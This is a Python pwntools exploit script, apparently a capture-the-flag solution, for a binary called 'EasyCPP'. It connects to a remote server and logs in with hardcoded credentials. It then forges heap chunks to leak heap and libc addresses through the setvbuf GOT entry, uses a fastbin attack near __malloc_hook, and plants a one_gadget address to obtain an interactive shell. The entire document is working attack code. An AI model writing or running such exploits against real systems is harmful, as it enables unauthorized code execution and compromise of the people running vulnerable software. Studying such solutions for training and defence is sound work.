from pwn import *
import binascii
import subprocess

file_crack = './EasyCPP'
glibc = '/lib/x86_64-linux-gnu/libc.so.6'
domain_name = '202.38.93.241'
port = 10012
remo = 1
archive = 'amd64'

context(os='linux', arch=archive, log_level='debug')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def one_gadget(filename):
  return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))

def complement_code_32(num):
    return num & 0xffffffff
def complement_code_64(num):
    return num & 0xffffffffffffffff

elf = ELF(file_crack)
if remo:
    n = remote(domain_name, port)
else:
    n = elf.process(env={'LD_PRELOAD':glibc})


def z():
    if remo == 0:
        gdb.attach(n)
        pause()


def edit(pswd, stu_num):
    n.sendlineafter("choice:", '1')
    n.sendafter("password:", pswd)
    n.sendafter("please:", stu_num)
    n.sendlineafter("grade(0~100):", '0')
    n.sendlineafter("grade:", '0')
    n.sendlineafter("grade:", '0')
    n.sendlineafter("grade:", '0')


one_gadget_ = one_gadget(glibc)
log.info(map(lambda x: hex(x), one_gadget_))


n.sendlineafter("Username:", 'admin')
n.sendafter("Password:", 'p455w0rd')

pswd_addr = 0x6032e0

# leak heap
pay = (p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x21)).ljust(0x80, '\x00') + p64(0)
edit(pay, 'a'* 0x20)
pay = (p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x21)).ljust(0x80, '\x00') + p64(pswd_addr + 0x10)
edit(pay, 'a')
n.recvuntil("STUDENT: ")
heap_addr = u64(n.recvuntil("GPA")[:-3].ljust(8, '\x00'))
log.info(hex(heap_addr))

# leak libc
pay = (p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x21)).ljust(0x80, '\x00') +p64(heap_addr - 0x21)
edit(pay, 'a'*0x30)
pay = (p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x21)).ljust(0x80, '\x00') +p64(heap_addr - 0x41)
edit(pay, p64(elf.got['setvbuf']))
n.recvuntil("STUDENT: ")
libc_addr = u64(n.recvuntil("GPA")[:-3].ljust(8, '\x00'))
log.info(hex(libc_addr))
libc_base = libc_addr - 0x6fe70  # need to change

# get shell
pay = p64(0) + p64(0x71) + p64(0) * 12 + p64(0) + p64(0x21) + p64(pswd_addr + 0x10) + p64(0) * 2 + '\x21'
edit(pay, '\x00'*0x30)
pay = p64(0) + p64(0x71) + p64(libc_base + 0x3c4b20 - 0x33) + p64(0) * 11 + p64(0) + p64(0x21) + p64(0)*3 + '\x21'
edit(pay, '\x00'*0x67)
log.info(hex(libc_base + one_gadget_[0]))
pay = p64(0) + p64(0x71) + p64(libc_base + 0x3c4b20 - 0x33) + p64(0) * 11 + p64(0) + p64(0x21) + p64(0)*3 + '\x21'
edit(pay, ('\x00' * 0x13 + p64(libc_base + one_gadget_[2])).ljust(0x67, '\x00'))

n.sendlineafter("choice:", '1')
n.sendafter("password:", 'aaaa')

n.interactive()

